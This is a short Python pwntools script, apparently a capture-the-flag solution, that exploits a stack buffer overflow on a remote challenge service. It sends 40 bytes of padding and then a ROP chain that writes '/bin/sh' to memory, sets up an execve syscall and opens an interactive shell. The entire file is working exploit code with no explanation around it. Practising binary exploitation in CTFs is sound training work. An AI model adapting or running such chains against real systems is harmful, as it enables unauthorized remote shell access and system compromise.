#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
# padding 40

p = remote("ctf.racterub.me", 3006)
context.arch = "amd64"

p.recvuntil("input :")

payload = cyclic(40)

############################
# Gadget

# 
pop_rax_rdx_rbx = 0x0000000000478636

buf = 0x6cbb60
pop_rdi = 0x00000000004014c6
mov_prdi_rdx = 0x0000000000435453
pop_rsi = 0x00000000004015e7
pop_rdx = 0x0000000000442896
syscall = 0x0000000000467265

# rdi OK
payload += flat([pop_rdi, buf, pop_rdx, "/bin/sh\x00", mov_prdi_rdx])
# rax,rdx OK
payload += flat([pop_rax_rdx_rbx, 0x3b, 0, 0])
# rsi OK
payload += flat([pop_rsi, 0])
# syscall
payload += flat([syscall])


p.sendline(payload)
p.interactive()









